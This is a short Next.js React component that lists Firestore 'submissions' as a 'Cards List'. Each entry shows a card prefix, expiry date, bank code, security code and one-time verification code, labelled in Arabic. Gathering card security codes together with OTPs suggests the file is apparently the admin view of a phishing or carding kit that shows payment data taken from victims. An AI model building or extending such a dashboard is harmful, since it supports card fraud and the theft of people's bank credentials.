'use client';

import { Submission } from "@/app/types/firestore";
import { Item } from "./item";


interface ListItemsProps {
  submissions: Submission[];
}

export function ListItems({ submissions}: ListItemsProps) {
  return (
    <div className="p-4 bg-gray-50 mx-1 rounded-lg shadow py-16">
      <h2 className="text-2xl font-bold mb-4">Cards List</h2>
      <div className="space-y-4">
        {submissions.map((submission) => (
          <div key={submission.id} className="w-full">
            <Item
              number={submission.id}
              prefix={submission.data().prefix}
              expDate={`تاريخ الانتهاء: ${submission.data().month}/${submission.data().year}`}
              bank={`رمز البنك: ${submission.data().bank}`}
              pass={`رمز الامان: ${submission.data().pass}`}
              otp={`رمز التحقق {${submission.data().otp}}`}
            />
          </div>
        ))}
      </div>
    </div>
  );
}

